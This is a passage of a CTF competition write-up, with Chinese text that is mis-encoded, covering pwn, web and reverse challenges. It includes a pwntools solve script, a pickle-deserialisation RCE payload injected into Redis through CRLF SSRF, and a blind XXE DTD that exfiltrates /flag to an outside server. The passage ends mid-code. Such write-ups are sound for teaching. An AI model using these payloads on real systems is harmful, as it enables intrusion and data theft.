alt="image.png"><br>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://qanux.github.io/2024/04/22/geek2024/index.html">https://qanux.github.io/2024/04/22/geek2024/index.html</a><br>åˆ©ç”¨è„šæœ¬è¿›è¡Œæ›´æ–°<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000915845-57755e75-109f-4bcd-92d8-01649e10567f.png#averageHue=%23e9e9e9&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=79&amp;id=u5b8ab700&amp;originHeight=119&amp;originWidth=1138&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19958&amp;status=done&amp;style=none&amp;taskId=uc31c430d-408b-46fb-89b1-4fcbfd0d67c&amp;title=&amp;width=758.6666666666666" alt="image.png"><br>è¿™é‡Œçš„o_curl.exeæ˜¯å½“å‰è‡ªå·±ç³»ç»Ÿçš„curl.exeï¼Œ-oæ˜¯è¦è¾“å‡ºçš„æ–‡ä»¶åï¼Œrä¸ºå›æ»šçš„ï¼Œè¦æŠŠè¿™ä¸ªré‡Œçš„è§£å‹å‡ºæ¥çš„æ–‡ä»¶æ›¿æ¢æˆè‡ªå·±ç³»ç»Ÿçš„è¡¥ä¸é‡Œçš„ï¼Œfé‡Œçš„æ˜¯å‹ç¼©åŒ…é‡Œçš„ï¼ˆäº‹å®ä¸Šå°±è¿™ä¸€ä¸ªæœ‰ç”¨çš„ï¼‰<br>å‡ºæ¥ä¸ªnnn.exe<br>è‡ªå·±ç³»ç»Ÿè¡¥ä¸ä½ç½®ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000871074-f02c0e14-6dd7-4369-80b2-ab0fc49ce6d3.png#averageHue=%23f9f8f8&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=134&amp;id=u3b91cc18&amp;originHeight=201&amp;originWidth=773&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=16654&amp;status=done&amp;style=none&amp;taskId=ub71bc11d-2583-43a8-bd2f-98de89d2d2e&amp;title=&amp;width=515.3333333333334" alt="image.png"><br>å¤§æ¦‚å°±æ˜¯åœ¨winsxsä¸­æœç´¢curlæœ‰å…³çš„æ–‡ä»¶ï¼ˆä¹Ÿå¯èƒ½ä¸æ˜¯è¿™é‡Œè¾¹çš„ï¼Œåœ¨å…¶ä»–è¡¥ä¸é‡Œï¼Œç›´æ¥å…¨å±€æœä¹Ÿè¡Œï¼‰<br>è¿è¡Œå‘½ä»¤åå¾—åˆ°æœ€ç»ˆè¾“å‡ºçš„æ–‡ä»¶<br>çœ‹ä¸‹ç‰ˆæœ¬<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000887771-38ef610f-f0f8-4119-a0cf-64d42a8e897f.png#averageHue=%23151311&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=93&amp;id=ua4ea2b61&amp;originHeight=139&amp;originWidth=824&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19767&amp;status=done&amp;style=none&amp;taskId=u2490ad99-dc3a-4047-a7ab-81197a1415c&amp;title=&amp;width=549.3333333333334" alt="image.png"><br>å¾—åˆ°flag</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>ncåç”¨é˜Ÿä¼tokenè¿æ¥<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1714994481062-c54c911c-25a6-4e4f-af53-dc48ae968a09.png#averageHue=%23050403&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=737&amp;id=ua208fa5a&amp;originHeight=1105&amp;originWidth=1362&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=276409&amp;status=done&amp;style=none&amp;taskId=u0389955e-c2da-41c1-8fc8-da60ae70065&amp;title=&amp;width=908" alt="image.png"><br>æºç mainå‡½æ•°åˆ†æ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">load</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;7z&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your token:&quot;</span>);<span class="comment">//è¾“å…¥token</span></span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(token, buf)) &#123;<span class="comment">//è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong token!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">zip</span>(buf);<span class="comment">//å‹ç¼©æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your flag:&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(<span class="string">&quot;flag&#123;&quot;</span>, buf)) &#123;<span class="comment">//è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">unzip</span>(buf);<span class="comment">//è§£å‹</span></span><br><span class="line"></span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;flag.txt not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), f);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿æ¥å<br>1.å…ˆæ¯”è¾ƒtoken<br>2.ç„¶åç”¨tokenåšå¯†ç å»å‹ç¼©<br>3.è¦ç”¨ä»¥â€œflag{â€å¼€å¤´çš„å­—ç¬¦ä¸²<br>4.å¾—åˆ°è§£å‹çš„flag<br>å…¶ä¸­<br>tokenåœ¨å¤„ç†æ—¶ï¼Œåœ¨ç¬¬65ç½®0ï¼Œæ‰€ä»¥å°±è¦tokençš„å‰64ä½<br>3æ­¥ä¸­è¦ç»•è¿‡flag{ï¼Œå¯ä»¥é€šè¿‡ä¼ DELï¼ˆASCII:127ï¼‰åˆ é™¤<br>payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob03.contest.pku.edu.cn&#x27;</span>, <span class="number">10003</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)#</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your token:\n&#x27;</span>, b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;flag&#123;&#x27;</span>+b<span class="string">&#x27;\x7f&#x27;</span>*<span class="number">5</span>+b<span class="string">&quot;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&quot;</span></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your flag:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="phpsql"><a href="#phpsql" class="headerlink" title="phpsql"></a>phpsql</h2><p>æ³¨å†Œadminæ˜¾ç¤ºå·²ç»å­˜åœ¨</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714992887587-02327559-9444-4a1a-a1f9-dd0e928c598d.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=160&amp;id=uecceb6b4&amp;originHeight=240&amp;originWidth=844&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=20062&amp;status=done&amp;style=none&amp;taskId=u66937d01-7573-4a5c-b7e9-6d7ccce62e4&amp;title=&amp;width=562.6666666666666" alt="image.png"></p><p>ç»“åˆé¢˜ç›®phpsqlåº”è¯¥æ˜¯ä¸‡èƒ½å¯†ç æ³¨å…¥è¿›å…¥åå°<br>ç›´æ¥æ‹¿sqlè¯­å¥å­—å…¸è·‘</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993045758-5d5a39af-821d-4573-92f8-1acbce11c6f0.png#averageHue=%23f7f6f6&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=808&amp;id=ue685cc7e&amp;originHeight=1212&amp;originWidth=1740&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=193028&amp;status=done&amp;style=none&amp;taskId=udfec92e2-bd07-4848-98f3-1be74fbbfcc&amp;title=&amp;width=1160" alt="image.png"></p><p>ç›´æ¥è·‘è¿›å»</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993089174-839db6d3-1ae0-4e02-aa7d-90c465139d17.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=579&amp;id=uca6f4055&amp;originHeight=868&amp;originWidth=2106&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=102070&amp;status=done&amp;style=none&amp;taskId=uebf09cf5-a2db-485f-acef-b0c9c6471cd&amp;title=&amp;width=1404" alt="image.png"></p><h2 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h2><p>æ ¹æ®é¢˜ç›®ä¸æç¤ºpyssrfåŠ ä»€ä¹ˆå¹´ä»£äº†è¿˜ç”¨python3.7.1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994494037-64fd117e-7f50-497c-adde-f2b742683b6e.png#averageHue=%23f7f6f5&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=421&amp;id=u05709a18&amp;originHeight=631&amp;originWidth=2358&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=163353&amp;status=done&amp;style=none&amp;taskId=ud0145662-c860-4a16-b1fe-b4c1b7540d4&amp;title=&amp;width=1572" alt="image.png"><br>python3.7.1çš„ç¯å¢ƒä¸­,urllibæœ‰è¯·æ±‚å¤´æ³¨å…¥<br>redis è§£æ<br>GET /?<br>payload<br>padding<br>åŸºæœ¬ä¸Šå¯ä»¥ç†è§£ä¸º<br>pickleååºåˆ—åŒ–+redis+rce+ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">opcode=<span class="string">&#x27;&#x27;&#x27;(S&#x27;mkdir ./static;cp /flag ./static/f&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">key=hashlib.md5(<span class="string">&quot;http://test/&quot;</span>.encode()).hexdigest()</span><br><span class="line">value=base64.b64encode(opcode).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;set&#x27;</span>,key,value)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="number">0439</span>e<span class="number">1</span>ff<span class="number">2</span>e<span class="number">65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span>c<span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span> KFM<span class="symbol">nbWtkaXIgLi9</span>zdGF<span class="number">0</span>aW<span class="name">M7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zC<span class="symbol">nN5</span>c<span class="number">3</span>RlbQou</span><br></pre></td></tr></table></figure><p>æ„é€ url</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url<span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span>?<span class="variable">%0</span>d<span class="variable">%0</span>aset<span class="variable">%200439</span>e<span class="number">1</span>ff<span class="number">2e65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span><span class="keyword">c</span><span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span><span class="variable">%20</span>KFMnbWtkaXIgLi<span class="number">9</span>zdGF<span class="number">0</span>aWM<span class="number">7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zCnN<span class="number">5</span><span class="keyword">c</span><span class="number">3</span>RlbQou<span class="variable">%0</span>d<span class="variable">%0</span>apadding<span class="variable">%0</span>d<span class="variable">%0</span>a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994544337-8fb892d3-eb1f-4eb6-8519-8009cbc7f922.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=636&amp;id=uf7471715&amp;originHeight=954&amp;originWidth=2073&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=172099&amp;status=done&amp;style=none&amp;taskId=ue5891c29-eb99-432b-b100-a8274cef51a&amp;title=&amp;width=1382" alt="image.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">url</span>=test/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994558947-f9549518-8176-46fa-8351-57e63ed42029.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=651&amp;id=u073badac&amp;originHeight=976&amp;originWidth=1699&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=145448&amp;status=done&amp;style=none&amp;taskId=u519df234-d0e8-423b-9fcf-86a8a9c6272&amp;title=&amp;width=1132.6666666666667" alt="image.png"></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994569753-437c68fe-8887-4069-b2da-66a5ce52d809.png#averageHue=%23f4f4f4&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=212&amp;id=ubc48bda5&amp;originHeight=145&amp;originWidth=508&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=17040&amp;status=done&amp;style=none&amp;taskId=uc9fa657c-22d7-40c4-b606-19b564e9126&amp;title=&amp;width=741.6666870117188" alt="image.png"><br>æ‰“å¼€å³å¯å¾—åˆ°flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994749430-228bc4a8-970d-4ba2-be9e-40588181af13.png#averageHue=%23e9e8e7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=216&amp;id=u42b4835f&amp;originHeight=186&amp;originWidth=664&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=22735&amp;status=done&amp;style=none&amp;taskId=u011f692d-726d-4248-8c67-5518ae96ede&amp;title=&amp;width=772.6666870117188" alt="image.png"></p><h2 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h2><p>æºç æœ‰æç¤º<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993406997-f9ee5e83-dd7b-4205-b62b-96a9dc140d30.png#averageHue=%23161616&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=141&amp;id=u612e9f98&amp;originHeight=212&amp;originWidth=856&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=15062&amp;status=done&amp;style=none&amp;taskId=ucc6f4d6c-11a1-4cf6-a0e2-a3284806825&amp;title=&amp;width=570.6666666666666" alt="image.png"><br>æµ‹è¯•åå‘ç°è¦æ‰“æ— å›æ˜¾xxe<br>vpsåˆ›å»ºflag.dtdæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">ccc</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; aba SYSTEM &#x27;http://43.143.167.75:8888?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%ccc;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%aba;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®Œæˆåï¼Œåœ¨å½“å‰ç›®å½•èµ·pythonæœåŠ¡<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993610279-870a1647-d25a-4e40-bb49-5c79545d395b.png#averageHue=%23363534&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=214&amp;id=u42df1cf2&amp;originHeight=321&amp;originWidth=1166&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=32773&amp;status=done&amp;style=none&amp;taskId=u7a0eaf35-9ca7-430d-bb2f-9535f88f7a3&amp;title=&amp;width=777.3333333333334" alt="image.png"><br>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE a [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://43.143.167.75:8888/flag.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">    %xxe;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    ]&gt;</span></span></span><br></pre></td></tr></table></figure><p>åˆå§‹é¡µé¢æŠ“åŒ…åï¼Œpostä¼ å‚ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993694538-4c066cf9-fdf1-4797-8480-57b979fc7e14.png#averageHue=%2395a06c&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=699&amp;id=u4362b49d&amp;originHeight=1048&amp;originWidth=1584&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=243273&amp;status=done&amp;style=none&amp;taskId=u863ea369-8f5f-4208-a767-00ff811e152&amp;title=&amp;width=1056" alt="image.png"><br>å‘é€åï¼Œvpså°±ä¼šæ˜¾ç¤ºæ¥æ”¶çš„æ•°æ®<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993724668-023b3aaa-ce9d-4493-bc71-bba222e1d145.png#averageHue=%233e3d3b&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=301&amp;id=u173b80ae&amp;originHeight=452&amp;originWidth=1359&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=59092&amp;status=done&amp;style=none&amp;taskId=ud783355a-defd-4cf3-a73e-ccdb63a3d3f&amp;title=&amp;width=906" alt="image.png"><br>base64è§£ç ï¼Œæ‹¿åˆ°flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993743242-9254f3fc-1ecb-4b04-b0cf-c98c234f8510.png#averageHue=%23ebebea&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=322&amp;id=u1c691f26&amp;originHeight=483&amp;originWidth=998&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=24179&amp;status=done&amp;style=none&amp;taskId=ue2aef635-3d68-400d-8485-5e0b7981eb3&amp;title=&amp;width=665.3333333333334" alt="image.png"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezayre"><a href="#ezayre" class="headerlink" title="ezayre"></a>ezayre</h2><p>64ä½æ— å£³elfï¼Œæ‹‰è¿›idaçœ‹çœ‹<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765706-a3095736-a5b7-47ba-b23d-866b730cb950.png#averageHue=%23f9f7f7&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u88596a10&amp;originHeight=547&amp;originWidth=772&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u8ce547ae-6a90-4b8b-b514-63aa2ba03ac&amp;title=" alt=""><br>é”å®šä¸»è¦å‡½æ•°æ˜¯sub_1208ï¼Œè·Ÿè¿›ä¹‹åæœ‰çˆ†çº¢ï¼Œä¿®å¥½ä¹‹ååŠ å¯†é€»è¾‘å¦‚ä¸‹ï¼Œçœ‹åˆ°ä¸‹å›¾æ ‡çº¢å¤„ä¹‹åï¼Œæ„Ÿè§‰æ˜¯base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765742-1cdb534e-27d7-4cc4-bd45-aa83c1012e4d.png#averageHue=%23f9f9f9&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u473e1a4e&amp;originHeight=763&amp;originWidth=1028&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u6ad6fd18-57fa-4756-b6d4-ff3312d6be2&amp;title=" alt=""><br>ç›´æ¥æŸ¥æ‰¾ä¸€ä¸‹å­—ç¬¦ä¸²<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765707-401ce508-7aea-4897-b4c8-b0654fdb8d8e.png#averageHue=%23f8f5f3&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=uccc36a39&amp;originHeight=574&amp;originWidth=899&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ube02818f-1435-4679-a1f9-838ade16a94&amp;title=" alt=""><br>çœ‹è§å˜è¡¨å’Œå¯†æ–‡ä¹‹åç›´æ¥ç§’äº†<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765583-e9e645b8-9ff4-46fd-9c35-39f31dbd8769.png#averageHue=%23e7e6e6&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=ufd19f407&amp;originHeight=643&amp;originWidth=1279&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ua3dbb87b-6b69-43c5-885e-877b4c5bed9&amp;title=" alt=""></p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>æ­£å¸¸è„±upxå£³ä¹‹åæ‹‰è¿›ida<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765670-b0ad82b2-4f5e-497d-a3c4-2ece25075536.png#averageHue=%23fdfafa&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u0449cf0a&amp;originHeight=495&amp;originWidth=710&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u7e3cab4e-b008-44e1-9042-057ce5f3d78&amp;title=" alt=""><br>ç›´æ¥æŠŠå››ä¸ªå‡½æ•°ä¸­çš„åŠ å¯†é€†ä¸€ä¸‹ï¼Œéƒ½æ˜¯ä¸€äº›åŸºæœ¬åŠ å¯†æ“ä½œï¼Œç›´æ¥çˆ†ç ´ä¸€ä¸‹ï¼Œæ³¨æ„çˆ†ç ´çš„å–å€¼åŒºé—´æ˜¯0~2^32-1,åŒ…å«æ‰€æœ‰32æ— ç¬¦å·æ•´æ•°ï¼ŒæŠŠå†…å®¹åˆä¸€ä¸‹ï¼Œexpå¦‚ä¸‹ï¼ˆPS:ç¬¬ä¸€ä¸ªå‡½æ•°å°±åŠ å‡å€¼åŠ å¯†ï¼Œä¸å†™å…¥å‡½æ•°äº†å°±ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 